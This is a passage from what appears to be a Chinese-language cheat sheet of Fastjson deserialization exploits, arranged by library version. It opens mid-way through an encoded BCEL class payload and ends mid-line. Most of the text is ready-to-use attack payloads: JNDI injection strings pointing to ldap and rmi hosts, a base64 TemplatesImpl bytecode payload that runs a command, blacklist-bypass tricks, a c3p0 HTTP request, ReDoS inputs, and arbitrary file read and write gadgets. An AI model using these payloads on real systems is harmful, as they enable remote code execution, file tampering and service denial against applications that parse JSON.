$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\u0026quot; } } : \u0026quot;xxx\u0026quot; } }  1.2.33\u0026lt;=fastjson\u0026lt;=12.36\n{ \u0026quot;name\u0026quot;: { \u0026quot;@type\u0026quot; : \u0026quot;java.lang.Class\u0026quot;, \u0026quot;val\u0026quot; : \u0026quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\u0026quot; }, \u0026quot;x\u0026quot; : { \u0026quot;name\u0026quot;: { \u0026quot;@type\u0026quot; : \u0026quot;java.lang.Class\u0026quot;, \u0026quot;val\u0026quot; : \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, { \u0026quot;@type\u0026quot;:\u0026quot;com.alibaba.fastjson.JSONObject\u0026quot;, \u0026quot;c\u0026quot;: { \u0026quot;@type\u0026quot;:\u0026quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\u0026quot;, \u0026quot;driverClassLoader\u0026quot;: { \u0026quot;@type\u0026quot; : \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, \u0026quot;driverClassName\u0026quot;:\u0026quot;$$BCEL...\u0026quot; } } : \u0026quot;ddd\u0026quot; } }  1.2.37\u0026lt;=fastjson\u0026lt;=1.2.47\n{ \u0026quot;name\u0026quot;: { \u0026quot;@type\u0026quot; : \u0026quot;java.lang.Class\u0026quot;, \u0026quot;val\u0026quot; : \u0026quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\u0026quot; }, \u0026quot;x\u0026quot; : { \u0026quot;name\u0026quot;: { \u0026quot;@type\u0026quot; : \u0026quot;java.lang.Class\u0026quot;, \u0026quot;val\u0026quot; : \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, \u0026quot;y\u0026quot;: { \u0026quot;@type\u0026quot;:\u0026quot;com.alibaba.fastjson.JSONObject\u0026quot;, \u0026quot;c\u0026quot;: { \u0026quot;@type\u0026quot;:\u0026quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\u0026quot;, \u0026quot;driverClassLoader\u0026quot;: { \u0026quot;@type\u0026quot; : \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, \u0026quot;driverClassName\u0026quot;:\u0026quot;$$BCEL$..\u0026quot;, \u0026quot;$ref\u0026quot;: \u0026quot;$.x.y.c.connection\u0026quot; } } } }  其他\n{ \u0026quot;@type\u0026quot;: \u0026quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource\u0026quot;, \u0026quot;key\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.lang.Class\u0026quot;, \u0026quot;val\u0026quot;: \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, \u0026quot;driverClassLoader\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, \u0026quot;driver\u0026quot;: \u0026quot;$$BCEL$$xxxxxxx\u0026quot; }  TemplatesImpl 利用条件苛刻，可用于解决不出网利用。\n需要调用parseObject()方法时，加入Feature.SupportNonPublicField参数。\n_bytecodes要进行base64编码\n{\u0026quot;@type\u0026quot;:\u0026quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026quot;,\u0026quot;_bytecodes\u0026quot;:[\u0026quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg==\u0026quot;],\u0026quot;_name\u0026quot;:\u0026quot;a.b\u0026quot;,\u0026quot;_tfactory\u0026quot;:{ },\u0026quot;_outputProperties\u0026quot;:{ },\u0026quot;_version\u0026quot;:\u0026quot;1.0\u0026quot;,\u0026quot;allowedProtocols\u0026quot;:\u0026quot;all\u0026quot;}  c3p0#WrapperConnectionPoolDataSource 可用于解决不出网利用。\nfastjson \u0026lt;1.2.47\n利用c3p0二次反序列化 cc payload到达回显。\nPOST /json HTTP/1.1 Host: 127.0.0.1:8999 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate cmd: dir Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 8925 {\u0026quot;e\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.lang.Class\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\u0026quot;},\u0026quot;f\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\u0026quot;,\u0026quot;userOverridesAsString\u0026quot;:\u0026quot;HexAsciiSerializedMapu0026quot;}}  Fastjson 1.2.25-1.2.41 1.2.25后将TypeUtils.loadClass替换为checkAutoType()函数，增加了黑名单和白名单。\n把autoTypeSupport默认为False。\n当autoTypeSupport为False时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。\n当autoTypeSupport为True时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。\n1.2.25黑名单\nbsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework  exp\n条件需要开启autotype\n类名前面加了一个L，后面加一个;可以绕过黑名单\n{\u0026quot;@type\u0026quot;:\u0026quot;Lcom.sun.rowset.JdbcRowSetImpl;\u0026quot;,\u0026quot;dataSourceName\u0026quot;:\u0026quot;ldap://localhost:1389/badNameClass\u0026quot;, \u0026quot;autoCommit\u0026quot;:true}  Fastjson 1.2.25-1.2.42 从1.2.42版本开始,把之前的明文黑名单，改为hash黑名单。\n如下大佬整理的\nhttps://github.com/LeadroyaL/fastjson-blacklist\nexp\n条件需要开启autotype\n双写绕过\n{\u0026quot;@type\u0026quot;:\u0026quot;LLcom.sun.rowset.JdbcRowSetImpl;;\u0026quot;,\u0026quot;dataSourceName\u0026quot;:\u0026quot;ldap://localhost:1389/badNameClass\u0026quot;, \u0026quot;autoCommit\u0026quot;:true}  Fastjson 1.2.25-1.2.43 exp\n条件需要开启autotype\n加[{绕过\n{\u0026quot;@type\u0026quot;:\u0026quot;[com.sun.rowset.JdbcRowSetImpl\u0026quot;[{,\u0026quot;dataSourceName\u0026quot;:\u0026quot;ldap://localhost:1389/badNameClass\u0026quot;, \u0026quot;autoCommit\u0026quot;:true}  Fastjson 1.2.25-1.2.45 条件需要开启autotype\n45把之前问题修了，但是可以借助第三方组件绕过。\n需要mybatis，且版本需为3.x.x系列\u0026lt;3.5.0的版本。\n{\u0026quot;@type\u0026quot;:\u0026quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\u0026quot;,\u0026quot;properties\u0026quot;:{\u0026quot;data_source\u0026quot;:\u0026quot;ldap://localhost:1389/badNameClass\u0026quot;}}  Fastjson1.2.25-1.2.47通杀 借助缓存进行通杀，缓存在1.2.48被改为默认关闭\n漏洞原理是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测\n这里有两大版本范围：\n 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用  poc:\n{ \u0026quot;a\u0026quot;:{ \u0026quot;@type\u0026quot;:\u0026quot;java.lang.Class\u0026quot;, \u0026quot;val\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot; }, \u0026quot;b\u0026quot;:{ \u0026quot;@type\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;, \u0026quot;dataSourceName\u0026quot;:\u0026quot;ldap://localhost:1389/badNameClass\u0026quot;, \u0026quot;autoCommit\u0026quot;:true } }  1.2.48之后版本，小弟水平有限还未复现研究，payload需要注意的细节还未探索\nFastjson 1.2.36 - 1.2.62 正则表达式拒绝服务漏洞\n{ \u0026quot;regex\u0026quot;:{ \u0026quot;$ref\u0026quot;:\u0026quot;$[\\blue = /\\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]\u0026quot; }, \u0026quot;blue\u0026quot;:\u0026quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\u0026quot; }  { \u0026quot;regex\u0026quot;:{ \u0026quot;$ref\u0026quot;:\u0026quot;$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']\u0026quot; }, \u0026quot;blue\u0026quot;:\u0026quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\u0026quot; }  Fastjson1.2.5 \u0026lt;= 1.2.59 需要开启AutoType\n{\u0026quot;@type\u0026quot;:\u0026quot;com.zaxxer.hikari.HikariConfig\u0026quot;,\u0026quot;metricRegistry\u0026quot;:\u0026quot;ldap://localhost:1389/Exploit\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;com.zaxxer.hikari.HikariConfig\u0026quot;,\u0026quot;healthCheckRegistry\u0026quot;:\u0026quot;ldap://localhost:1389/Exploit\u0026quot;}  Fastjson1.2.5 \u0026lt;= 1.2.60 无需开启 autoType：\n{\u0026quot;@type\u0026quot;:\u0026quot;oracle.jdbc.connector.OracleManagedConnectionFactory\u0026quot;,\u0026quot;xaDataSourceName\u0026quot;:\u0026quot;rmi://10.10.20.166:1099/ExportObject\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.commons.configuration.JNDIConfiguration\u0026quot;,\u0026quot;prefix\u0026quot;:\u0026quot;ldap://10.10.20.166:1389/ExportObject\u0026quot;}  Fastjson1.2.5 \u0026lt;= 1.2.61 {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider\u0026quot;,\u0026quot;jndiName\u0026quot;:\u0026quot;ldap://localhost:1389/Exploit\u0026quot;,\u0026quot;Object\u0026quot;:\u0026quot;a\u0026quot;}  Fastjson \u0026lt;1.2.62  需要开启AutoType； Fastjson \u0026lt;= 1.2.62； JNDI注入利用所受的JDK版本限制； 目标服务端需要存在xbean-reflect包；  {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.xbean.propertyeditor.JndiConverter\u0026quot;,\u0026quot;AsText\u0026quot;:\u0026quot;rmi://127.0.0.1:1098/exploit\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor\u0026quot;, \u0026quot;parameters\u0026quot;: {\u0026quot;@type\u0026quot;:\u0026quot;java.util.Hashtable\u0026quot;,\u0026quot;java.naming.factory.initial\u0026quot;:\u0026quot;com.sun.jndi.rmi.registry.RegistryContextFactory\u0026quot;,\u0026quot;topic-factory\u0026quot;:\u0026quot;ldap://localhost:1389/Exploit\u0026quot;}, \u0026quot;namespace\u0026quot;:\u0026quot;\u0026quot;}  fastjson\u0026lt;=1.2.66 前提条件  开启AutoType； Fastjson \u0026lt;= 1.2.66； JNDI注入利用所受的JDK版本限制； org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包； br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包； com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；  {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.shiro.jndi.JndiObjectFactory\u0026quot;,\u0026quot;resourceName\u0026quot;:\u0026quot;ldap://192.168.80.1:1389/Calc\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.shiro.realm.jndi.JndiRealmFactory\u0026quot;, \u0026quot;jndiNames\u0026quot;:[\u0026quot;ldap://localhost:1389/Exploit\u0026quot;], \u0026quot;Realms\u0026quot;:[\u0026quot;\u0026quot;]} {\u0026quot;@type\u0026quot;:\u0026quot;br.com.anteros.dbcp.AnterosDBCPConfig\u0026quot;,\u0026quot;metricRegistry\u0026quot;:\u0026quot;ldap://192.168.80.1:1389/Calc\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;br.com.anteros.dbcp.AnterosDBCPConfig\u0026quot;,\u0026quot;healthCheckRegistry\u0026quot;:\u0026quot;ldap://localhost:1389/Exploit\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\u0026quot;,\u0026quot;jndiNames\u0026quot;:\u0026quot;ldap://192.168.80.1:1389/Calc\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\u0026quot;,\u0026quot;properties\u0026quot;: {\u0026quot;@type\u0026quot;:\u0026quot;java.util.Properties\u0026quot;,\u0026quot;UserTransaction\u0026quot;:\u0026quot;ldap://192.168.80.1:1399/Calc\u0026quot;}}  适用于jdk11以上版本的写文件的payload：\n{ \u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;: \u0026quot;sun.rmi.server.MarshalOutputStream\u0026quot;, \u0026quot;out\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.util.zip.InflaterOutputStream\u0026quot;, \u0026quot;out\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.io.FileOutputStream\u0026quot;, \u0026quot;file\u0026quot;: \u0026quot;/tmp/asdasd\u0026quot;, \u0026quot;append\u0026quot;: true }, \u0026quot;infl\u0026quot;: { \u0026quot;input\u0026quot;: { \u0026quot;array\u0026quot;: \u0026quot;eJxLLE5JTCkGAAh5AnE=\u0026quot;, \u0026quot;limit\u0026quot;: 14 } }, \u0026quot;bufLen\u0026quot;: \u0026quot;100\u0026quot; }, \u0026quot;protocolVersion\u0026quot;: 1 }  fastjson\u0026lt;=1.2.67 前提条件  开启AutoType； Fastjson \u0026lt;= 1.2.67； JNDI注入利用所受的JDK版本限制； org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖； org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；  {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\u0026quot;, \u0026quot;jndiNames\u0026quot;:[\u0026quot;ldap://localhost:1389/Exploit\u0026quot;], \u0026quot;tm\u0026quot;: {\u0026quot;$ref\u0026quot;:\u0026quot;$.tm\u0026quot;}} {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.shiro.jndi.JndiObjectFactory\u0026quot;,\u0026quot;resourceName\u0026quot;:\u0026quot;ldap://localhost:1389/Exploit\u0026quot;,\u0026quot;instance\u0026quot;:{\u0026quot;$ref\u0026quot;:\u0026quot;$.instance\u0026quot;}}  fastjson\u0026lt;=1.2.68  Fastjson \u0026lt;= 1.2.68； 利用类必须是expectClass类的子类或实现类，并且不在黑名单中；  {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\u0026quot;,\u0026quot;metricRegistry\u0026quot;:\u0026quot;ldap://localhost:1389/Exploit\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\u0026quot;,\u0026quot;healthCheckRegistry\u0026quot;:\u0026quot;ldap://localhost:1389/Exploit\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;com.caucho.config.types.ResourceRef\u0026quot;,\u0026quot;lookupName\u0026quot;: \u0026quot;ldap://localhost:1389/Exploit\u0026quot;, \u0026quot;value\u0026quot;: {\u0026quot;$ref\u0026quot;:\u0026quot;$.value\u0026quot;}}  无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行：\n{\u0026quot;@type\u0026quot;:\u0026quot;java.lang.AutoCloseable\u0026quot;,\u0026quot;@type\u0026quot;:\u0026quot;vul.VulAutoCloseable\u0026quot;,\u0026quot;cmd\u0026quot;:\u0026quot;calc\u0026quot;}  读文件\n{\u0026quot;@type\u0026quot;:\u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;:\u0026quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\u0026quot;, \u0026quot;tempPath\u0026quot;:\u0026quot;C:/Windows/win.ini\u0026quot;, \u0026quot;targetPath\u0026quot;:\u0026quot;D:/wamp64/www/win.txt\u0026quot;}  写文件\n{ \u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;: \u0026quot;java.io.FileOutputStream\u0026quot;, \u0026quot;file\u0026quot;: \u0026quot;/tmp/nonexist\u0026quot;, \u0026quot;append\u0026quot;: \u0026quot;false\u0026quot; }  { \u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;: \u0026quot;java.io.FileWriter\u0026quot;, \u0026quot;file\u0026quot;: \u0026quot;/tmp/nonexist\u0026quot;, \u0026quot;append\u0026quot;: \u0026quot;false\u0026quot; }  写文件\n{ \u0026quot;stream\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;: \u0026quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\u0026quot;, \u0026quot;targetPath\u0026quot;: \u0026quot;D:/wamp64/www/hacked.txt\u0026quot;, \u0026quot;tempPath\u0026quot;: \u0026quot;D:/wamp64/www/test.txt\u0026quot; }, \u0026quot;writer\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;: \u0026quot;com.esotericsoftware.kryo.io.Output\u0026quot;, \u0026quot;buffer\u0026quot;: \u0026quot;cHduZWQ=\u0026quot;, \u0026quot;outputStream\u0026quot;: { \u0026quot;$ref\u0026quot;: \u0026quot;$.stream\u0026quot; }, \u0026quot;position\u0026quot;: 5 }, \u0026quot;close\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;: \u0026quot;com.sleepycat.bind.serial.SerialOutput\u0026quot;, \u0026quot;out\u0026quot;: { \u0026quot;$ref\u0026quot;: \u0026quot;$.writer\u0026quot; } } }  写文件\n{ 'stream': { '@type':\u0026quot;java.lang.AutoCloseable\u0026quot;, '@type':'java.io.FileOutputStream', 'file':'/tmp/nonexist', 'append':false }, 'writer': { '@type':\u0026quot;java.lang.AutoCloseable\u0026quot;, '@type':'org.apache.solr.common.util.FastOutputStream', 'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=', 'sink': { '$ref':'$.stream' }, 'start':38 }, 'close': { '@type':\u0026quot;java.lang.AutoCloseable\u0026quot;, '@type':'org.iq80.snappy.SnappyOutputStream', 'out': { '$ref':'$.writer' } } }  适用于jdk8/10的\n{ \u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;: \u0026quot;sun.rmi.server.MarshalOutputStream\u0026quot;, \u0026quot;out\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.util.zip.InflaterOutputStream\u0026quot;, \u0026quot;out\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.io.FileOutputStream\u0026quot;, \u0026quot;file\u0026quot;: \u0026quot;dst\u0026quot;, \u0026quot;append\u0026quot;: \u0026quot;false\u0026quot; }, \u0026quot;infl\u0026quot;: { \u0026quot;input\u0026quot;: \u0026quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==\u0026quot; }, \u0026quot;bufLen\u0026quot;: 1048576 }, \u0026quot;protocolVersion\u0026quot;: 1 }  jdk 8\n position写入的长度，必须和base64编码前的长度一致。  { \u0026quot;stream\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;: \u0026quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\u0026quot;, \u0026quot;targetPath\u0026quot;: \u0026quot;f:/pwn.txt\u0026quot;, \u0026quot;tempPath\u0026quot;: \u0026quot;\u0026quot; }, \u0026quot;writer\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;: \u0026quot;com.esotericsoftware.kryo.io.Output\u0026quot;, \u0026quot;buffer\u0026quot;: \u0026quot;YjF1M3I=\u0026quot;, \u0026quot;outputStream\u0026quot;: { \u0026quot;$ref\u0026quot;: \u0026quot;$.stream\u0026quot; }, \u0026quot;position\u0026quot;: 5 }, \u0026quot;close\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;, \u0026quot;@type\u0026quot;: \u0026quot;com.sleepycat.bind.serial.SerialOutput\u0026quot;, \u0026quot;out\u0026quot;: { \u0026quot;$ref\u0026quot;: \u0026quot;$.writer\u0026quot; } } }  2021黑帽大会腾讯玄武披露\n详细漏洞原理待研究\nhttps://b1ue.cn/archives/506.html\nMysqlconnector 5.1.x {\u0026quot;@type\u0026quot;:\u0026quot;java.lang.AutoCloseable\u0026quot;,\u0026quot;@type\u0026quot;:\u0026quot;com.mysql.jdbc.JDBC4Connection\u0026quot;,\u0026quot;hostToConnectTo\u0026quot;:\u0026quot;mysql.host\u0026quot;,\u0026quot;portToConnectTo\u0026quot;:3306,\u0026quot;info\u0026quot;:{\u0026quot;user\u0026quot;:”user\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;pass\u0026quot;,\u0026quot;statementInterceptors\u0026quot;:\u0026quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026quot;,\u0026quot;autoDeserialize\u0026quot;:\u0026quot;true\u0026quot;,\u0026quot;NUM_HOSTS\u0026quot;: \u0026quot;1\u0026quot;},\u0026quot;databaseToConnectTo\u0026quot;:\u0026quot;dbname\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;\u0026quot;} Mysqlconnector 6.0.2 or 6.0.3 {\u0026quot;@type\u0026quot;: \u0026quot;java.lang.AutoCloseable\u0026quot;,\u0026quot;@type\u0026quot;: \u0026quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\u0026quot;,\u0026quot;proxy\u0026quot;:{\u0026quot;connectionString\u0026quot;:{\u0026quot;url\u0026quot;: \u0026quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true\u0026quot;}}} Mysqlconnector 6.x or \u0026lt; 